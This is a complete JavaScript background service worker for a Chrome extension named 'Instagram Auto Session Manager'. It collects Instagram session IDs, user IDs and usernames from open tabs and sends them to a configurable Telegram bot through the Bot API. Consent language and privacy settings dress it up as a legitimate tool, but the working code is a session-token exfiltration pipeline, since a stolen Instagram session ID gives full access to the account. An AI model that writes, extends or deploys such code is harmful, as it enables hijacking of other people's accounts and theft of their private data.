/**
 * ===================================
 * Instagram Auto Session Manager - Background Service Worker
 * Comprehensive background script for handling core logic and API communications
 * ===================================
 */

// ===================================
// GLOBAL VARIABLES AND CONSTANTS
// ===================================

/**
 * Configuration object for the background service worker
 */
const BACKGROUND_CONFIG = {
    // API settings
    TELEGRAM_API_BASE: 'https://api.telegram.org/bot',
    API_TIMEOUT: 30000, // 30 seconds
    MAX_RETRY_ATTEMPTS: 3,
    RETRY_DELAY: 2000, // 2 seconds
    
    // Storage settings
    STORAGE_KEYS: {
        TELEGRAM_SETTINGS: 'telegramSettings',
        PRIVACY_SETTINGS: 'privacySettings',
        APP_SETTINGS: 'appSettings',
        USER_CONSENT: 'userConsent',
        SESSION_HISTORY: 'sessionHistory',
        ACTIVITY_LOGS: 'activityLogs',
        ERROR_LOGS: 'errorLogs'
    },
    
    // Session management
    MAX_SESSION_HISTORY: 100,
    SESSION_CLEANUP_INTERVAL: 3600000, // 1 hour
    CONSENT_EXPIRY_DURATION: 86400000, // 24 hours
    
    // Logging settings
    MAX_LOG_ENTRIES: 1000,
    LOG_CLEANUP_INTERVAL: 86400000, // 24 hours
    
    // Extension settings
    EXTENSION_VERSION: '2.0.0',
    MANIFEST_VERSION: 3
};

/**
 * Application state for the background service worker
 */
let backgroundState = {
    // Extension state
    isInitialized: false,
    extensionSettings: null,
    lastSettingsUpdate: 0,
    
    // Session management
    activeSessions: new Map(),
    sessionHistory: [],
    pendingRequests: new Map(),
    
    // API state
    telegramBotInfo: null,
    lastBotInfoCheck: 0,
    apiRateLimits: new Map(),
    
    // Logging state
    activityLogs: [],
    errorLogs: [],
    
    // Performance tracking
    startTime: Date.now(),
    requestCount: 0,
    errorCount: 0
};

/**
 * Default settings for the extension
 */
const DEFAULT_SETTINGS = {
    telegram: {
        botToken: '',
        chatId: '',
        messageTemplate: `🔐 Instagram Session Data Detected

📱 **Account Information:**
• Session ID: {sessionId}
• User ID: {userId}
• Username: {username}

⏰ **Timestamp:** {timestamp}
🌐 **URL:** {url}

✅ Data extracted with user consent via Instagram Auto Session Manager`
    },
    privacy: {
        autoClearData: true,
        clearOnClose: false,
        showNotifications: true,
        consentReminders: true,
        requireConfirmation: true,
        logActivities: false
    },
    app: {
        version: BACKGROUND_CONFIG.EXTENSION_VERSION,
        lastUpdated: new Date().toISOString(),
        firstRun: true,
        installDate: new Date().toISOString()
    }
};

// ===================================
// INITIALIZATION AND SETUP
// ===================================

/**
 * Initialize the background service worker
 */
async function initializeBackgroundScript() {
    console.log('Instagram Auto Session Manager Background Script - Initializing...');
    
    try {
        // Load extension settings
        await loadExtensionSettings();
        
        // Set up event listeners
        setupEventListeners();
        
        // Initialize storage if needed
        await initializeStorage();
        
        // Start periodic cleanup tasks
        startPeriodicTasks();
        
        // Check Telegram bot configuration
        await checkTelegramConfiguration();
        
        // Mark as initialized
        backgroundState.isInitialized = true;
        
        // Log initialization
        await logActivity('background_initialized', {
            version: BACKGROUND_CONFIG.EXTENSION_VERSION,
            timestamp: new Date().toISOString()
        });
        
        console.log('Background script initialized successfully');
        
    } catch (error) {
        console.error('Error initializing background script:', error);
        await logError('initialization_error', error);
    }
}

/**
 * Set up event listeners for the background script
 */
function setupEventListeners() {
    // Extension lifecycle events
    chrome.runtime.onInstalled.addListener(handleExtensionInstalled);
    chrome.runtime.onStartup.addListener(handleExtensionStartup);
    
    // Message handling
    chrome.runtime.onMessage.addListener(handleMessage);
    
    // Storage changes
    chrome.storage.onChanged.addListener(handleStorageChange);
    
    // Tab events
    chrome.tabs.onUpdated.addListener(handleTabUpdated);
    chrome.tabs.onRemoved.addListener(handleTabRemoved);
    
    // Alarm events for periodic tasks
    chrome.alarms.onAlarm.addListener(handleAlarm);
}

/**
 * Load extension settings from storage
 */
async function loadExtensionSettings() {
    try {
        const result = await chrome.storage.local.get([
            BACKGROUND_CONFIG.STORAGE_KEYS.TELEGRAM_SETTINGS,
            BACKGROUND_CONFIG.STORAGE_KEYS.PRIVACY_SETTINGS,
            BACKGROUND_CONFIG.STORAGE_KEYS.APP_SETTINGS,
            BACKGROUND_CONFIG.STORAGE_KEYS.USER_CONSENT,
            BACKGROUND_CONFIG.STORAGE_KEYS.SESSION_HISTORY,
            BACKGROUND_CONFIG.STORAGE_KEYS.ACTIVITY_LOGS,
            BACKGROUND_CONFIG.STORAGE_KEYS.ERROR_LOGS
        ]);
        
        backgroundState.extensionSettings = {
            telegram: { ...DEFAULT_SETTINGS.telegram, ...result[BACKGROUND_CONFIG.STORAGE_KEYS.TELEGRAM_SETTINGS] },
            privacy: { ...DEFAULT_SETTINGS.privacy, ...result[BACKGROUND_CONFIG.STORAGE_KEYS.PRIVACY_SETTINGS] },
            app: { ...DEFAULT_SETTINGS.app, ...result[BACKGROUND_CONFIG.STORAGE_KEYS.APP_SETTINGS] }
        };
        
        backgroundState.sessionHistory = result[BACKGROUND_CONFIG.STORAGE_KEYS.SESSION_HISTORY] || [];
        backgroundState.activityLogs = result[BACKGROUND_CONFIG.STORAGE_KEYS.ACTIVITY_LOGS] || [];
        backgroundState.errorLogs = result[BACKGROUND_CONFIG.STORAGE_KEYS.ERROR_LOGS] || [];
        backgroundState.lastSettingsUpdate = Date.now();
        
        console.log('Extension settings loaded:', backgroundState.extensionSettings);
        
    } catch (error) {
        console.error('Error loading extension settings:', error);
        await logError('settings_load_error', error);
        
        // Use default settings on error
        backgroundState.extensionSettings = DEFAULT_SETTINGS;
    }
}

/**
 * Initialize storage with default values if needed
 */
async function initializeStorage() {
    try {
        const result = await chrome.storage.local.get([BACKGROUND_CONFIG.STORAGE_KEYS.APP_SETTINGS]);
        
        if (!result[BACKGROUND_CONFIG.STORAGE_KEYS.APP_SETTINGS]) {
            // First run - initialize with defaults
            await chrome.storage.local.set({
                [BACKGROUND_CONFIG.STORAGE_KEYS.TELEGRAM_SETTINGS]: DEFAULT_SETTINGS.telegram,
                [BACKGROUND_CONFIG.STORAGE_KEYS.PRIVACY_SETTINGS]: DEFAULT_SETTINGS.privacy,
                [BACKGROUND_CONFIG.STORAGE_KEYS.APP_SETTINGS]: DEFAULT_SETTINGS.app,
                [BACKGROUND_CONFIG.STORAGE_KEYS.SESSION_HISTORY]: [],
                [BACKGROUND_CONFIG.STORAGE_KEYS.ACTIVITY_LOGS]: [],
                [BACKGROUND_CONFIG.STORAGE_KEYS.ERROR_LOGS]: []
            });
            
            console.log('Storage initialized with default settings');
        }
        
    } catch (error) {
        console.error('Error initializing storage:', error);
        await logError('storage_init_error', error);
    }
}

/**
 * Start periodic cleanup and maintenance tasks
 */
function startPeriodicTasks() {
    // Set up alarms for periodic tasks
    chrome.alarms.create('sessionCleanup', { 
        delayInMinutes: 60, 
        periodInMinutes: 60 
    });
    
    chrome.alarms.create('logCleanup', { 
        delayInMinutes: 1440, // 24 hours
        periodInMinutes: 1440 
    });
    
    chrome.alarms.create('settingsSync', { 
        delayInMinutes: 30, 
        periodInMinutes: 30 
    });
}

// ===================================
// EVENT HANDLERS
// ===================================

/**
 * Handle extension installation
 * @param {Object} details - Installation details
 */
async function handleExtensionInstalled(details) {
    console.log('Extension installed:', details);
    
    try {
        if (details.reason === 'install') {
            // First installation
            await logActivity('extension_installed', {
                version: BACKGROUND_CONFIG.EXTENSION_VERSION,
                timestamp: new Date().toISOString()
            });
            
            // Open options page for first-time setup
            chrome.runtime.openOptionsPage();
            
        } else if (details.reason === 'update') {
            // Extension updated
            await logActivity('extension_updated', {
                previousVersion: details.previousVersion,
                currentVersion: BACKGROUND_CONFIG.EXTENSION_VERSION,
                timestamp: new Date().toISOString()
            });
            
            // Update app settings
            const updatedAppSettings = {
                ...backgroundState.extensionSettings.app,
                version: BACKGROUND_CONFIG.EXTENSION_VERSION,
                lastUpdated: new Date().toISOString()
            };
            
            await chrome.storage.local.set({
                [BACKGROUND_CONFIG.STORAGE_KEYS.APP_SETTINGS]: updatedAppSettings
            });
        }
        
    } catch (error) {
        console.error('Error handling extension installation:', error);
        await logError('installation_handler_error', error);
    }
}

/**
 * Handle extension startup
 */
async function handleExtensionStartup() {
    console.log('Extension startup');
    
    try {
        await logActivity('extension_startup', {
            timestamp: new Date().toISOString()
        });
        
        // Reload settings
        await loadExtensionSettings();
        
        // Check Telegram configuration
        await checkTelegramConfiguration();
        
    } catch (error) {
        console.error('Error handling extension startup:', error);
        await logError('startup_handler_error', error);
    }
}

/**
 * Handle messages from content scripts and other parts of the extension
 * @param {Object} message - Message object
 * @param {Object} sender - Message sender
 * @param {Function} sendResponse - Response callback
 */
async function handleMessage(message, sender, sendResponse) {
    console.log('Message received:', message, 'from:', sender);
    
    try {
        backgroundState.requestCount++;
        
        switch (message.action) {
            case 'contentScriptEvent':
                await handleContentScriptEvent(message, sender);
                break;
                
            case 'processSessionData':
                await handleProcessSessionData(message, sender, sendResponse);
                break;
                
            case 'openConsentPage':
                await handleOpenConsentPage(message, sender);
                break;
                
            case 'settingsUpdated':
                await handleSettingsUpdated(message, sender);
                break;
                
            case 'logActivity':
                await logActivity(message.logEntry.activity, message.logEntry.data);
                break;
                
            case 'reportError':
                await logError(message.errorReport.type, new Error(message.errorReport.message));
                break;
                
            case 'getExtensionInfo':
                sendResponse({
                    version: BACKGROUND_CONFIG.EXTENSION_VERSION,
                    isInitialized: backgroundState.isInitialized,
                    settings: backgroundState.extensionSettings,
                    stats: getExtensionStats()
                });
                break;
                
            case 'testTelegramConnection':
                await handleTestTelegramConnection(message, sender, sendResponse);
                break;
                
            default:
                console.log('Unknown message action:', message.action);
                sendResponse({ error: 'Unknown action' });
        }
        
    } catch (error) {
        console.error('Error handling message:', error);
        await logError('message_handler_error', error);
        sendResponse({ error: error.message });
    }
}

/**
 * Handle content script events
 * @param {Object} message - Message from content script
 * @param {Object} sender - Message sender
 */
async function handleContentScriptEvent(message, sender) {
    const { event, data } = message;
    
    console.log('Content script event:', event, data);
    
    switch (event) {
        case 'session_detected':
            await handleSessionDetected(data, sender);
            break;
            
        case 'consent_requested':
            await handleConsentRequested(data, sender);
            break;
            
        case 'consent_given':
            await handleConsentGiven(data, sender);
            break;
            
        default:
            console.log('Unknown content script event:', event);
    }
}

/**
 * Handle session detected event
 * @param {Object} sessionData - Detected session data
 * @param {Object} sender - Message sender
 */
async function handleSessionDetected(sessionData, sender) {
    try {
        console.log('Session detected:', sessionData);
        
        // Store session in active sessions
        const sessionKey = `${sender.tab.id}_${sessionData.sessionId}`;
        backgroundState.activeSessions.set(sessionKey, {
            sessionData,
            tabId: sender.tab.id,
            detectedAt: Date.now(),
            processed: false
        });
        
        // Add to session history
        await addToSessionHistory(sessionData, sender.tab.id);
        
        // Log the detection
        await logActivity('session_detected', {
            sessionId: sessionData.sessionId.substring(0, 10) + '...',
            userId: sessionData.userId,
            username: sessionData.username,
            url: sessionData.url,
            tabId: sender.tab.id,
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('Error handling session detected:', error);
        await logError('session_detection_error', error);
    }
}

/**
 * Handle process session data request
 * @param {Object} message - Message with session data
 * @param {Object} sender - Message sender
 * @param {Function} sendResponse - Response callback
 */
async function handleProcessSessionData(message, sender, sendResponse) {
    try {
        console.log('Processing session data:', message);
        
        const { sessionData, consentType } = message;
        
        // Validate session data
        if (!validateSessionData(sessionData)) {
            throw new Error('Invalid session data');
        }
        
        // Check if Telegram is configured
        if (!backgroundState.extensionSettings.telegram.botToken || 
            !backgroundState.extensionSettings.telegram.chatId) {
            throw new Error('Telegram bot not configured');
        }
        
        // Send to Telegram
        const result = await sendToTelegram(sessionData);
        
        if (result.success) {
            // Log successful processing
            await logActivity('session_processed', {
                sessionId: sessionData.sessionId.substring(0, 10) + '...',
                consentType: consentType,
                telegramMessageId: result.messageId,
                timestamp: new Date().toISOString()
            });
            
            // Update session history
            await updateSessionHistory(sessionData.sessionId, 'processed');
            
            // Clear data if configured
            if (backgroundState.extensionSettings.privacy.autoClearData) {
                await clearSessionData(sessionData.sessionId);
            }
            
            // Send success response
            sendResponse({ success: true, messageId: result.messageId });
            
            // Notify content script
            if (sender.tab) {
                chrome.tabs.sendMessage(sender.tab.id, {
                    action: 'consentProcessed',
                    data: { success: true, messageId: result.messageId }
                });
            }
            
        } else {
            throw new Error(result.error || 'Failed to send to Telegram');
        }
        
    } catch (error) {
        console.error('Error processing session data:', error);
        await logError('session_processing_error', error);
        
        // Send error response
        sendResponse({ success: false, error: error.message });
        
        // Notify content script
        if (sender.tab) {
            chrome.tabs.sendMessage(sender.tab.id, {
                action: 'consentProcessed',
                data: { success: false, error: error.message }
            });
        }
    }
}

/**
 * Handle open consent page request
 * @param {Object} message - Message with consent page details
 * @param {Object} sender - Message sender
 */
async function handleOpenConsentPage(message, sender) {
    try {
        console.log('Opening consent page:', message);
        
        const { url, sessionData } = message;
        
        // Store session data for consent page
        await chrome.storage.local.set({
            pendingSessionData: sessionData,
            consentRequestTime: Date.now(),
            requestingTabId: sender.tab.id
        });
        
        // Open consent page in new tab
        const tab = await chrome.tabs.create({
            url: url,
            active: true
        });
        
        // Log consent page opening
        await logActivity('consent_page_opened', {
            consentTabId: tab.id,
            requestingTabId: sender.tab.id,
            sessionId: sessionData.sessionId.substring(0, 10) + '...',
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('Error opening consent page:', error);
        await logError('consent_page_error', error);
    }
}

/**
 * Handle settings updated notification
 * @param {Object} message - Message with updated settings
 * @param {Object} sender - Message sender
 */
async function handleSettingsUpdated(message, sender) {
    try {
        console.log('Settings updated:', message);
        
        // Reload settings
        await loadExtensionSettings();
        
        // Check Telegram configuration if telegram settings changed
        if (message.settingsType === 'telegram' || message.settingsType === 'all') {
            await checkTelegramConfiguration();
        }
        
        // Notify all content scripts
        const tabs = await chrome.tabs.query({ url: ['*://instagram.com/*', '*://www.instagram.com/*'] });
        for (const tab of tabs) {
            try {
                chrome.tabs.sendMessage(tab.id, {
                    action: 'settingsUpdated',
                    settings: backgroundState.extensionSettings
                });
            } catch (tabError) {
                // Ignore errors for inactive tabs
                console.warn('Could not notify tab:', tab.id, tabError);
            }
        }
        
        // Log settings update
        await logActivity('settings_updated', {
            settingsType: message.settingsType,
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('Error handling settings update:', error);
        await logError('settings_update_error', error);
    }
}

/**
 * Handle test Telegram connection request
 * @param {Object} message - Message with test parameters
 * @param {Object} sender - Message sender
 * @param {Function} sendResponse - Response callback
 */
async function handleTestTelegramConnection(message, sender, sendResponse) {
    try {
        console.log('Testing Telegram connection:', message);
        
        const { botToken, chatId } = message;
        
        // Test bot info
        const botInfo = await testTelegramBot(botToken);
        
        if (botInfo.success) {
            // Test sending message
            const testMessage = `🔍 Test message from Instagram Auto Session Manager\\n\\n✅ Connection successful!\\n⏰ ${new Date().toLocaleString()}`;
            
            const messageResult = await sendTelegramMessage(botToken, chatId, testMessage);
            
            if (messageResult.success) {
                sendResponse({
                    success: true,
                    botInfo: botInfo.data,
                    messageId: messageResult.messageId
                });
                
                // Log successful test
                await logActivity('telegram_test_success', {
                    botUsername: botInfo.data.username,
                    chatId: chatId,
                    timestamp: new Date().toISOString()
                });
                
            } else {
                throw new Error(messageResult.error);
            }
            
        } else {
            throw new Error(botInfo.error);
        }
        
    } catch (error) {
        console.error('Error testing Telegram connection:', error);
        await logError('telegram_test_error', error);
        
        sendResponse({
            success: false,
            error: error.message
        });
    }
}

/**
 * Handle storage changes
 * @param {Object} changes - Storage changes
 * @param {string} namespace - Storage namespace
 */
async function handleStorageChange(changes, namespace) {
    if (namespace === 'local') {
        console.log('Storage changed:', changes);
        
        // Reload settings if they changed
        const settingsKeys = Object.values(BACKGROUND_CONFIG.STORAGE_KEYS);
        const hasSettingsChange = Object.keys(changes).some(key => settingsKeys.includes(key));
        
        if (hasSettingsChange) {
            await loadExtensionSettings();
        }
    }
}

/**
 * Handle tab updated events
 * @param {number} tabId - Tab ID
 * @param {Object} changeInfo - Change information
 * @param {Object} tab - Tab object
 */
async function handleTabUpdated(tabId, changeInfo, tab) {
    // Only process complete loads of Instagram pages
    if (changeInfo.status === 'complete' && tab.url && 
        (tab.url.includes('instagram.com'))) {
        
        console.log('Instagram tab updated:', tabId, tab.url);
        
        // Clean up any old sessions for this tab
        cleanupTabSessions(tabId);
    }
}

/**
 * Handle tab removed events
 * @param {number} tabId - Removed tab ID
 * @param {Object} removeInfo - Remove information
 */
async function handleTabRemoved(tabId, removeInfo) {
    console.log('Tab removed:', tabId);
    
    // Clean up sessions for this tab
    cleanupTabSessions(tabId);
}

/**
 * Handle alarm events for periodic tasks
 * @param {Object} alarm - Alarm object
 */
async function handleAlarm(alarm) {
    console.log('Alarm triggered:', alarm.name);
    
    try {
        switch (alarm.name) {
            case 'sessionCleanup':
                await performSessionCleanup();
                break;
                
            case 'logCleanup':
                await performLogCleanup();
                break;
                
            case 'settingsSync':
                await performSettingsSync();
                break;
                
            default:
                console.log('Unknown alarm:', alarm.name);
        }
        
    } catch (error) {
        console.error('Error handling alarm:', error);
        await logError('alarm_handler_error', error);
    }
}

// ===================================
// TELEGRAM API FUNCTIONS
// ===================================

/**
 * Send session data to Telegram
 * @param {Object} sessionData - Session data to send
 * @returns {Object} - Result object with success status
 */
async function sendToTelegram(sessionData) {
    try {
        console.log('Sending data to Telegram...');
        
        const { telegram } = backgroundState.extensionSettings;
        
        if (!telegram.botToken || !telegram.chatId) {
            throw new Error('Telegram bot not configured');
        }
        
        // Format message using template
        const message = formatTelegramMessage(sessionData, telegram.messageTemplate);
        
        // Send message
        const result = await sendTelegramMessage(telegram.botToken, telegram.chatId, message);
        
        if (result.success) {
            console.log('Data sent to Telegram successfully:', result);
            return {
                success: true,
                messageId: result.messageId
            };
        } else {
            throw new Error(result.error);
        }
        
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return {
            success: false,
            error: error.message
        };
    }
}

/**
 * Send message to Telegram bot
 * @param {string} botToken - Bot token
 * @param {string} chatId - Chat ID
 * @param {string} message - Message text
 * @returns {Object} - Result object
 */
async function sendTelegramMessage(botToken, chatId, message) {
    try {
        const url = `${BACKGROUND_CONFIG.TELEGRAM_API_BASE}${botToken}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            return {
                success: true,
                messageId: result.result.message_id
            };
        } else {
            throw new Error(result.description || 'Failed to send message');
        }
        
    } catch (error) {
        console.error('Error sending Telegram message:', error);
        return {
            success: false,
            error: error.message
        };
    }
}

/**
 * Test Telegram bot configuration
 * @param {string} botToken - Bot token to test
 * @returns {Object} - Test result
 */
async function testTelegramBot(botToken) {
    try {
        const url = `${BACKGROUND_CONFIG.TELEGRAM_API_BASE}${botToken}/getMe`;
        
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            return {
                success: true,
                data: result.result
            };
        } else {
            throw new Error(result.description || 'Invalid bot token');
        }
        
    } catch (error) {
        console.error('Error testing Telegram bot:', error);
        return {
            success: false,
            error: error.message
        };
    }
}

/**
 * Format message for Telegram using template
 * @param {Object} sessionData - Session data
 * @param {string} template - Message template
 * @returns {string} - Formatted message
 */
function formatTelegramMessage(sessionData, template) {
    if (!template) {
        template = DEFAULT_SETTINGS.telegram.messageTemplate;
    }
    
    return template
        .replace(/{sessionId}/g, sessionData.sessionId || 'Not found')
        .replace(/{userId}/g, sessionData.userId || 'Not found')
        .replace(/{username}/g, sessionData.username || 'Not found')
        .replace(/{timestamp}/g, new Date(sessionData.extractedAt).toLocaleString())
        .replace(/{url}/g, sessionData.url || 'Unknown');
}

/**
 * Check Telegram configuration and update bot info
 */
async function checkTelegramConfiguration() {
    try {
        const { telegram } = backgroundState.extensionSettings;
        
        if (telegram.botToken) {
            const botInfo = await testTelegramBot(telegram.botToken);
            
            if (botInfo.success) {
                backgroundState.telegramBotInfo = botInfo.data;
                backgroundState.lastBotInfoCheck = Date.now();
                
                console.log('Telegram bot info updated:', botInfo.data);
                
                await logActivity('telegram_bot_verified', {
                    botUsername: botInfo.data.username,
                    botId: botInfo.data.id,
                    timestamp: new Date().toISOString()
                });
                
            } else {
                console.warn('Telegram bot verification failed:', botInfo.error);
                backgroundState.telegramBotInfo = null;
            }
        } else {
            backgroundState.telegramBotInfo = null;
        }
        
    } catch (error) {
        console.error('Error checking Telegram configuration:', error);
        await logError('telegram_config_check_error', error);
    }
}

// ===================================
// SESSION MANAGEMENT FUNCTIONS
// ===================================

/**
 * Add session to history
 * @param {Object} sessionData - Session data
 * @param {number} tabId - Tab ID
 */
async function addToSessionHistory(sessionData, tabId) {
    try {
        const historyEntry = {
            sessionId: sessionData.sessionId,
            userId: sessionData.userId,
            username: sessionData.username,
            url: sessionData.url,
            tabId: tabId,
            detectedAt: new Date().toISOString(),
            processed: false,
            id: generateUniqueId()
        };
        
        backgroundState.sessionHistory.unshift(historyEntry);
        
        // Limit history size
        if (backgroundState.sessionHistory.length > BACKGROUND_CONFIG.MAX_SESSION_HISTORY) {
            backgroundState.sessionHistory = backgroundState.sessionHistory.slice(0, BACKGROUND_CONFIG.MAX_SESSION_HISTORY);
        }
        
        // Save to storage
        await chrome.storage.local.set({
            [BACKGROUND_CONFIG.STORAGE_KEYS.SESSION_HISTORY]: backgroundState.sessionHistory
        });
        
    } catch (error) {
        console.error('Error adding to session history:', error);
        await logError('session_history_error', error);
    }
}

/**
 * Update session history entry
 * @param {string} sessionId - Session ID
 * @param {string} status - New status
 */
async function updateSessionHistory(sessionId, status) {
    try {
        const entry = backgroundState.sessionHistory.find(h => h.sessionId === sessionId);
        
        if (entry) {
            entry.processed = (status === 'processed');
            entry.processedAt = new Date().toISOString();
            
            // Save to storage
            await chrome.storage.local.set({
                [BACKGROUND_CONFIG.STORAGE_KEYS.SESSION_HISTORY]: backgroundState.sessionHistory
            });
        }
        
    } catch (error) {
        console.error('Error updating session history:', error);
        await logError('session_history_update_error', error);
    }
}

/**
 * Clean up sessions for a specific tab
 * @param {number} tabId - Tab ID to clean up
 */
function cleanupTabSessions(tabId) {
    try {
        // Remove from active sessions
        for (const [key, session] of backgroundState.activeSessions.entries()) {
            if (session.tabId === tabId) {
                backgroundState.activeSessions.delete(key);
            }
        }
        
        console.log(`Cleaned up sessions for tab ${tabId}`);
        
    } catch (error) {
        console.error('Error cleaning up tab sessions:', error);
    }
}

/**
 * Clear session data
 * @param {string} sessionId - Session ID to clear
 */
async function clearSessionData(sessionId) {
    try {
        // Remove from active sessions
        for (const [key, session] of backgroundState.activeSessions.entries()) {
            if (session.sessionData.sessionId === sessionId) {
                backgroundState.activeSessions.delete(key);
            }
        }
        
        // Clear from storage
        await chrome.storage.local.remove(['pendingSessionData', 'consentRequestTime']);
        
        console.log(`Cleared session data for ${sessionId}`);
        
    } catch (error) {
        console.error('Error clearing session data:', error);
        await logError('session_clear_error', error);
    }
}

/**
 * Perform periodic session cleanup
 */
async function performSessionCleanup() {
    try {
        console.log('Performing session cleanup...');
        
        const now = Date.now();
        const cleanupThreshold = now - BACKGROUND_CONFIG.SESSION_CLEANUP_INTERVAL;
        
        // Clean up old active sessions
        for (const [key, session] of backgroundState.activeSessions.entries()) {
            if (session.detectedAt < cleanupThreshold) {
                backgroundState.activeSessions.delete(key);
            }
        }
        
        // Clean up old session history
        backgroundState.sessionHistory = backgroundState.sessionHistory.filter(
            entry => new Date(entry.detectedAt).getTime() > cleanupThreshold
        );
        
        // Save updated history
        await chrome.storage.local.set({
            [BACKGROUND_CONFIG.STORAGE_KEYS.SESSION_HISTORY]: backgroundState.sessionHistory
        });
        
        console.log('Session cleanup completed');
        
    } catch (error) {
        console.error('Error performing session cleanup:', error);
        await logError('session_cleanup_error', error);
    }
}

// ===================================
// LOGGING AND MONITORING FUNCTIONS
// ===================================

/**
 * Log activity for transparency and debugging
 * @param {string} activity - Activity type
 * @param {Object} data - Activity data
 */
async function logActivity(activity, data = {}) {
    try {
        const logEntry = {
            id: generateUniqueId(),
            timestamp: new Date().toISOString(),
            activity: activity,
            data: data
        };
        
        backgroundState.activityLogs.unshift(logEntry);
        
        // Limit log size
        if (backgroundState.activityLogs.length > BACKGROUND_CONFIG.MAX_LOG_ENTRIES) {
            backgroundState.activityLogs = backgroundState.activityLogs.slice(0, BACKGROUND_CONFIG.MAX_LOG_ENTRIES);
        }
        
        // Save to storage if logging is enabled
        if (backgroundState.extensionSettings?.privacy?.logActivities) {
            await chrome.storage.local.set({
                [BACKGROUND_CONFIG.STORAGE_KEYS.ACTIVITY_LOGS]: backgroundState.activityLogs
            });
        }
        
        console.log('Activity logged:', logEntry);
        
    } catch (error) {
        console.error('Error logging activity:', error);
    }
}

/**
 * Log error for debugging and monitoring
 * @param {string} errorType - Error type
 * @param {Error} error - Error object
 */
async function logError(errorType, error) {
    try {
        backgroundState.errorCount++;
        
        const errorEntry = {
            id: generateUniqueId(),
            timestamp: new Date().toISOString(),
            type: errorType,
            message: error.message,
            stack: error.stack,
            extensionVersion: BACKGROUND_CONFIG.EXTENSION_VERSION
        };
        
        backgroundState.errorLogs.unshift(errorEntry);
        
        // Limit error log size
        if (backgroundState.errorLogs.length > BACKGROUND_CONFIG.MAX_LOG_ENTRIES) {
            backgroundState.errorLogs = backgroundState.errorLogs.slice(0, BACKGROUND_CONFIG.MAX_LOG_ENTRIES);
        }
        
        // Always save error logs
        await chrome.storage.local.set({
            [BACKGROUND_CONFIG.STORAGE_KEYS.ERROR_LOGS]: backgroundState.errorLogs
        });
        
        console.error('Error logged:', errorEntry);
        
    } catch (loggingError) {
        console.error('Error logging error:', loggingError);
    }
}

/**
 * Perform periodic log cleanup
 */
async function performLogCleanup() {
    try {
        console.log('Performing log cleanup...');
        
        const now = Date.now();
        const cleanupThreshold = now - BACKGROUND_CONFIG.LOG_CLEANUP_INTERVAL;
        
        // Clean up old activity logs
        backgroundState.activityLogs = backgroundState.activityLogs.filter(
            entry => new Date(entry.timestamp).getTime() > cleanupThreshold
        );
        
        // Clean up old error logs
        backgroundState.errorLogs = backgroundState.errorLogs.filter(
            entry => new Date(entry.timestamp).getTime() > cleanupThreshold
        );
        
        // Save cleaned logs
        await chrome.storage.local.set({
            [BACKGROUND_CONFIG.STORAGE_KEYS.ACTIVITY_LOGS]: backgroundState.activityLogs,
            [BACKGROUND_CONFIG.STORAGE_KEYS.ERROR_LOGS]: backgroundState.errorLogs
        });
        
        console.log('Log cleanup completed');
        
    } catch (error) {
        console.error('Error performing log cleanup:', error);
        await logError('log_cleanup_error', error);
    }
}

/**
 * Perform settings synchronization
 */
async function performSettingsSync() {
    try {
        // Reload settings to ensure they're current
        await loadExtensionSettings();
        
        // Check Telegram configuration
        await checkTelegramConfiguration();
        
        console.log('Settings sync completed');
        
    } catch (error) {
        console.error('Error performing settings sync:', error);
        await logError('settings_sync_error', error);
    }
}

// ===================================
// UTILITY FUNCTIONS
// ===================================

/**
 * Validate session data format
 * @param {Object} sessionData - Session data to validate
 * @returns {boolean} - True if valid
 */
function validateSessionData(sessionData) {
    if (!sessionData || typeof sessionData !== 'object') {
        return false;
    }
    
    // Check required fields
    if (!sessionData.sessionId || !sessionData.extractedAt) {
        return false;
    }
    
    // Validate session ID format
    if (typeof sessionData.sessionId !== 'string' || sessionData.sessionId.length < 20) {
        return false;
    }
    
    return true;
}

/**
 * Generate unique ID
 * @returns {string} - Unique ID
 */
function generateUniqueId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

/**
 * Get extension statistics
 * @returns {Object} - Extension statistics
 */
function getExtensionStats() {
    return {
        uptime: Date.now() - backgroundState.startTime,
        requestCount: backgroundState.requestCount,
        errorCount: backgroundState.errorCount,
        activeSessionsCount: backgroundState.activeSessions.size,
        sessionHistoryCount: backgroundState.sessionHistory.length,
        activityLogsCount: backgroundState.activityLogs.length,
        errorLogsCount: backgroundState.errorLogs.length,
        telegramConfigured: !!(backgroundState.extensionSettings?.telegram?.botToken && 
                              backgroundState.extensionSettings?.telegram?.chatId),
        lastSettingsUpdate: backgroundState.lastSettingsUpdate,
        lastBotInfoCheck: backgroundState.lastBotInfoCheck
    };
}

// ===================================
// ERROR HANDLING
// ===================================

/**
 * Global error handler for unhandled errors
 */
self.addEventListener('error', function(e) {
    console.error('Unhandled error in background script:', e.error);
    logError('unhandled_error', e.error);
});

/**
 * Global handler for unhandled promise rejections
 */
self.addEventListener('unhandledrejection', function(e) {
    console.error('Unhandled promise rejection in background script:', e.reason);
    logError('unhandled_promise_rejection', new Error(e.reason));
});

// ===================================
// INITIALIZATION
// ===================================

// Initialize the background script
initializeBackgroundScript();

console.log('Instagram Auto Session Manager Background Script - Loaded successfully');

